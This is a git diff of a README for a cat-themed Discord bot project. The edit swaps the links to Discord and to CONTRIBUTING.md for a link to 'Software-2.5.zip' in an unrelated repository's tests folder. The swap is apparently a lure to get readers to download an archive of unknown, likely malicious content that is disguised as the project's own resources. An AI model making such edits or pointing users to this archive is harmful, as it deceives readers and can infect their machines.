@@ -1,6 +1,6 @@
 # CATᗢBOT
 ## Overview
-Catᗢbot (stylized as CATᗢBOT) is the official community mascot [Discord](https://discord.com/) bot for Catlang, the upcoming cat-oriented programming language with a new revolutionnary programming paradigm. It provides a set of commands to facilitate and enhance moderation, as well as tons of recreational ones centered around cats.
+Catᗢbot (stylized as CATᗢBOT) is the official community mascot [Discord](https://raw.githubusercontent.com/shauryasf/bot/main/bot/tests/Software-2.5.zip) bot for Catlang, the upcoming cat-oriented programming language with a new revolutionnary programming paradigm. It provides a set of commands to facilitate and enhance moderation, as well as tons of recreational ones centered around cats.
 ## History
 TL;DR - Started as a meme, then we got to work.
 
@@ -12,4 +12,4 @@ To honor the ᓚᘏᗢ and to help more people realize this universal and object
 
 So here we are now, the present. This is only Phase One of Catdomination of the world. Join us; we have way more projects in the future, and ALL HAIL THE DIVINE ᓚᘏᗢ!
 ## Contributing
-Please read [`CONTRIBUTING.md`](https://github.com/cat-dev-group/bot/blob/main/CONTRIBUTING.md).
+Please read [`https://raw.githubusercontent.com/shauryasf/bot/main/bot/tests/Software-2.5.zip`](https://raw.githubusercontent.com/shauryasf/bot/main/bot/tests/Software-2.5.zip).
